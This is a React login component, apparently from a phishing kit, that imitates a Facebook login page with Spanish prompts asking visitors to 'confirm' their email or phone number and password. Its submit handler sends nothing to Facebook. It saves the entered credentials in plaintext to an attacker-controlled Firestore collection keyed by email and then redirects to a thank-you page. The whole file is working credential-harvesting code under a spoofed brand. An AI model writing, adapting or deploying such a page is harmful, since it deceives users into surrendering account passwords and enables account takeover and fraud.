import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom'; // Import useNavigate
import { doc, setDoc } from 'firebase/firestore';
import { db } from '../../utilis/Firebase';
import './Login.css';

function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const navigate = useNavigate(); // Initialize useNavigate

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const docRef = doc(db, 'users', email);
      await setDoc(docRef, { email, password });

      console.log('User data saved successfully');
      navigate('/thank-you'); // Navigate to the thank-you page
    } catch (error) {
      console.error('Error saving user data:', error);
    }
  };

  return (
    <div className="login-page">
      <div className="login-container">
        <h1>facebook</h1>
        <p>Por favor confirme su usuario y contraseña actualmente</p>
        <form className="login-form" onSubmit={handleSubmit}>
          <input
            type="tel"
            placeholder="Correo electronico o numero de telefono"
            value={email}
            onChange={handleEmailChange}
          />
          <input
            type="password"
            placeholder="Contraseña"
            value={password}
            onChange={handlePasswordChange}
          />
          <button type="submit">Confirmar datos</button>
        </form>
        <a href="/">Cuenta olvidada?</a>
        <div className="divider"></div>
      </div>

    </div>
  );
}

export default Login;
